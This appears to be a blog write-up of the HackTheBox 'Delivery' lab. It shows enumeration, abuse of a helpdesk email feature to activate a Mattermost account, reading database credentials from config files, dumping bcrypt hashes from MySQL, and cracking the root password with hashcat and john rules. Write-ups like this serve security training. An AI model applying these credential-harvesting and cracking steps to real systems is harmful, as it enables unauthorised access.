---
layout: post
title: Delivery
has_children: no
parent: HackTheBox
date: 2021-05-22
nav_order: 20210109
difficulty: Easy
reading_time: 10 min
screenshots: /assets/images/Screenshots/Delivery/
tags: HackTheBox Linux Easy insecure-credentials password-reuse hashcat-custom-rules john-custom-rules B2R writeup
---

{% include header.html %}
![box-summary.jpg]({{page.screenshots}}box-summary.jpg)


***

{% include TOC.md %}

## Introduction
**Delivery** is an easy difficulty Linux machine based on web sites enumeration and **putting the pieces together** in order to abuse a "by-design" function and get access to a restricted area where a password is disclosed. Once obtained a low-privileged access to the target it was possible to **leak mysql credentials** and database contents, obtaining a **list of users and relative hashes**. **Cracking** those **hashes** it was possible to obtain the root password. Because it reused the same credential also for the machine, reusing the same credentials provided a high privileged access to the target.  

### Improved skills:
- Enumeration & smart thinking
- Password hunting
- hachat / john custom rules

### Used tools:
- nmap
- gobuster
- hashcat
- john

***

## Enumeration
Scanned all TCP ports:
```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Delivery]
└─$ sudo nmap -p- 10.10.10.222 -sS -Pn -oN scans/all-ports.txt -v
[sudo] password for kali:
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8065/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 55.58 seconds
           Raw packets sent: 65621 (2.887MB) | Rcvd: 65796 (2.684MB)
```

Enumerated open TCP open ports:
```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Delivery]
└─$ sudo nmap -p22,80,8065 -sV -sC 10.10.10.222 -sT -Pn -oN scans/open-tcp-ports.txt
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp   open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome
8065/tcp open  unknown
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, max-age=31556926, public
|     Content-Length: 3108
|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Sun, 25 Apr 2021 20:37:14 GMT
|     X-Frame-Options: SAMEORIGIN
|     X-Request-Id: 4rg44j93ajy9tnsgzhfznr9ngh
|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
|     Date: Sun, 25 Apr 2021 20:44:57 GMT
|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Date: Sun, 25 Apr 2021 20:44:57 GMT
|_    Content-Length: 0
...
```

Nmap discovered one SSH service runnin on port 22 and **two different web services**, one of them running on **port 80** and the other one running on **port 8065**.

Enumerated port 80 using web browser:
![Pasted image 20210425223439.png]({{page.screenshots}}Pasted image 20210425223439.png)

The site seemed to be a static web site. However the *Contact us* page revealed a sub-domain that could be interesting:
![Pasted image 20210425223652.png]({{page.screenshots}}Pasted image 20210425223652.png)

Added the subdomain to _/etc/hosts_ and enumerated `helpdesk.delivery.htb`:
```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Delivery]
└─$ sudo nano /etc/hosts
...
10.10.10.222    delivery.htb helpdesk.delivery.htb
...
```
![Pasted image 20210425224606.png]({{page.screenshots}}Pasted image 20210425224606.png)

The site turned to be a support ticket system. Although it was possible to register an account, it was not possible to receive the verification email back. Because of this issue the only way to interact with the application was trough the **Guest user**.

To spread the attack surface, files and directories of the helpdesk subdomain were also enumerated, allowing to find an additional login form:
```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Delivery]
└─$ gobuster dir http://helpdesk.delivery.htb -w /usr/share/seclist/Discovery/Web-Contents/raft-medium-custom.txt -x php -t 30
...
/account.php          (Status: 200) [Size: 37319]
/ajax.php             (Status: 400) [Size: 17]
/api                  (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/api/]
/apps                 (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/apps/]
/assets               (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/assets/]
/avatar.php           (Status: 400) [Size: 40]
/captcha.php          (Status: 200) [Size: 3377]
/css                  (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/css/]
/images               (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/images/]
/index.php            (Status: 200) [Size: 4933]
/js                   (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/js/]
/kb                   (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/kb/]
/login.php            (Status: 422) [Size: 5181]
/logo.php             (Status: 302) [Size: 0] [--> /assets/default/images/logo.png]
/logout.php           (Status: 302) [Size: 13] [--> index.php]
/manage.php           (Status: 200) [Size: 63]
/offline.php          (Status: 302) [Size: 0] [--> index.php]
/open.php             (Status: 200) [Size: 8133]
/pages                (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/pages/]
/profile.php          (Status: 422) [Size: 5181]
/scp                  (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/scp/]
/.                    (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/./]
/tickets.php          (Status: 422) [Size: 5181]
/view.php             (Status: 200) [Size: 5263]
/web.config           (Status: 200) [Size: 2197]
...
```
![Pasted image 20210425225858.png]({{page.screenshots}}Pasted image 20210425225858.png)

After having enumerated the port 80, it was time to check also the service on port 8065, which turned to be a **Mattermost** application:
![Pasted image 20210425224309.png]({{page.screenshots}}Pasted image 20210425224309.png)

As for helpdesk.delivery.htb also in this case it was necessary to receive a confirmation email to activate the account. Directories and files enumeration on this service were not fruitful, forcing to proceed ed with further analyses on the other service.


## Foothold
Guest users are allowed to open support ticket on the Support Center application:
![Pasted image 20210425230944.png]({{page.screenshots}}Pasted image 20210425230944.png)

Once opened a ticket, the site allowed to **add comments** to the ticket **sending an email** to the corresponding associated inbox.
Having access to the ticket summary (through the id) and being able to receive emails, it was possible to **abuse the _send email_ function** to **receive the validation email** from the Mattermost application and activate the account.

Registered on Mattermost with 1203785@delivery.htb

Received the validation email in the form of a ticket update:
![Pasted image 20210426202700.png]({{page.screenshots}}Pasted image 20210426202700.png)

Activated the arbitrary account and logged inside the application:
![Pasted image 20210426202745.png]({{page.screenshots}}Pasted image 20210426202745.png)
![Pasted image 20210426202903.png]({{page.screenshots}}Pasted image 20210426202903.png)

Once inside the application some **credentials were leaked** due to an **insecure communication channel** and some other information about credentials rules were disclosed:
![Pasted image 20210426203342.png]({{page.screenshots}}Pasted image 20210426203342.png)

Leaked credentials were used and a low privileged access was obtained:
```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Delivery]
└─$ ssh maildeliverer@10.10.10.222
maildeliverer@10.10.10.222's password:
Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan  5 06:09:50 2021 from 10.10.14.5
maildeliverer@Delivery:~$ whoami
maildeliverer
```

## Privilege Escalation
Local enumeration revealed a **mysql service running on localhost**:
```bash
maildeliverer@Delivery:/var/www/osticket$ netstat -polentau | grep 127
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      110        15591      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      0          16779      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:1025          0.0.0.0:*               LISTEN      0          17735      -                    off (0.00/0/0)
...
```

osticket configuration file **leaked mysql credentials**:
```bash
maildeliverer@Delivery:/var/www/osticket$ cat ./upload/include/ost-config.php
...
# Encrypt/Decrypt secret key - randomly generated during installation.
define('SECRET_SALT','nP8uygzdkzXRLJzYUmdmLDEqDSq5bGk3');

#Default admin email. Used only on db connection issues and related alerts.
define('ADMIN_EMAIL','maildeliverer@delivery.htb');

# Database Options
# ---------------------------------------------------
# Mysql Login info
define('DBTYPE','mysql');
define('DBHOST','localhost');
define('DBNAME','osticket');
define('DBUSER','ost_user');
define('DBPASS','!H3l<redacted>');

# Table prefix
define('TABLE_PREFIX','ost_');
...
```

mattermost configuration file **leaked mysql credentials**:
```bash
maildeliverer@Delivery:/opt/mattermost/config$ cat config.json | grep -i sql -C5
        "DesktopLatestVersion": "",
        "DesktopMinVersion": "",
        "IosLatestVersion": "",
        "IosMinVersion": ""
    },
    "SqlSettings": {
        "DriverName": "mysql",
        "DataSource": "mmuser:Crack_...........@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
        "DataSourceReplicas": [],
        "DataSourceSearchReplicas": [],
        "MaxIdleConns": 20,
        "ConnMaxLifetimeMilliseconds": 3600000,

```

Logged within mysql using osticket leaked credentials and **extracted password hashes** for registered users:
```bash
maildeliverer@Delivery:/var/www/osticket$ mysql -u ost_user -p -D osticket
Enter password:
...
MariaDB [osticket]> select username,passwd,email,isadmin from ost_staff;
+---------------+--------------------------------------------------------------+----------------------------+---------+
| username      | passwd                                                       | email                      | isadmin |
+---------------+--------------------------------------------------------------+----------------------------+---------+
| maildeliverer | $2a$08$VlccTgoFaxEaGJ....................................... | maildeliverer@delivery.htb |       1 |
+---------------+--------------------------------------------------------------+----------------------------+---------+
1 row in set (0.000 sec)
...
```

Logged within mysql using mattermost leaked credentials and **extracted password hashes** for registered users:
```bash
maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser -p
...
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mattermost         |
+--------------------+
2 rows in set (0.000 sec)
...
MariaDB [mattermost]> select username, Password from Users;
+----------------------------------+--------------------------------------------------------------+
| username                         | Password                                                     |
+----------------------------------+--------------------------------------------------------------+
| surveybot                        |                                                              |
| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZ...................................... |
| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1...................................... |
| root                             | $2a$10$VM6EeymRxJ29r8W...................................... |
| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUc...................................... |
| channelexport                    |                                                              |
| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJ...................................... |
| maoutis                          | $2a$10$n5KAvICmMNkb.p2...................................... |
+----------------------------------+--------------------------------------------------------------+
8 rows in set (0.000 sec)
```

Following the hint gave inside the Mattermost application
> Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!"

it was possible to **crack the root user password** using **hashcat custom rules**:

Used rules: [https://github.com/praetorian-inc/Hob0Rules/blob/master/d3adhob0.rule](https://github.com/praetorian-inc/Hob0Rules/blob/master/d3adhob0.rule)
```bash
┌──(kali㉿kali)-[~/…/HTB/box/Delivery/loot]
└─$ hashid '$2a$10$VM6EeymRxJ29r8.......................................'
Analyzing '$2a$10$VM6EeymRxJ29r8.......................................'
[+] Blowfish(OpenBSD)
[+] Woltlab Burning Board 4.x
[+] bcrypt

┌──(kali㉿kali)-[~/…/HTB/box/Delivery/loot]
└─$ hashid maildeliverer-admin.passwd
--File 'maildeliverer-admin.passwd'--
Analyzing '$2a$10$VM6EeymRxJ29r8.......................................'
[+] Blowfish(OpenBSD)
[+] Woltlab Burning Board 4.x
[+] bcrypt
--End of file 'maildeliverer-admin.passwd'--

┌──(kali㉿kali)-[~/…/HTB/box/Delivery/loot]
└─$ echo 'PleaseSubscribe!' > base_passwords

┌──(kali㉿kali)-[~/…/HTB/box/Delivery/loot]
└─$ cat mattermost-hashes.passwd| grep root > root.passwd

┌──(kali㉿kali)-[~/…/HTB/box/Delivery/loot]
└─$ hashcat root.passwd base_passwords -m3200 -r d3adhob0.rule --force --username --separator ":"
hashcat (v6.1.1) starting...
...
$2a$10$VM6EeymRxJ29r8.......................................:PleaseSubscribe!<redacted>
...
```

The same can be achieved also using john-the-ripper and john custom rules:
```bash
┌──(kali㉿kali)-[~/…/HTB/box/Delivery/loot]
└─$ sudo nano /etc/john/john.conf
...
[List.Rules:Custom]
:
# Add one number
$[0-9]
# Add one number and a sybol
$[0-9]$[$%^&*()\\-_+=|\<>\[\]{}#@/~]
# Add two number
$[0-9]$[0-9]
# Add two number and a symbol
$[0-9]$[0-9]$[$%^&*()\\-_+=|\<>\[\]{}#@/~]
...

┌──(kali㉿kali)-[~/…/HTB/box/Delivery/loot]
└─$ john root.passwd --wordlist=base_passwords --rules=Custom --fork=5                
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Node numbers 1-5 of 5 (fork)
Each node loaded the whole wordfile to memory
Press 'q' or Ctrl-C to abort, almost any other key for status
PleaseSubscribe!<redacted> (root)
...
```

Once obtained the root password it was possible to change the account to the root one:
```bash
maildeliverer@Delivery:~$ su root
Password:
root@Delivery:/home/maildeliverer# whoami && hostname && cat /root/root.txt && ip a
root
Delivery
1df26a288718072c85da8349534ed570
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:cb:0a brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.222/24 brd 10.10.10.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:cb0a/64 scope global dynamic mngtmpaddr
       valid_lft 86036sec preferred_lft 14036sec
    inet6 fe80::250:56ff:feb9:cb0a/64 scope link
       valid_lft forever preferred_lft forever
```

![Pasted image 20210427101539.png]({{page.screenshots}}Pasted image 20210427101539.png)

## Trophy
```
As always we start with nmap... but it can take a while so I've already ran it
- ippsec
```


{% include share.html %}
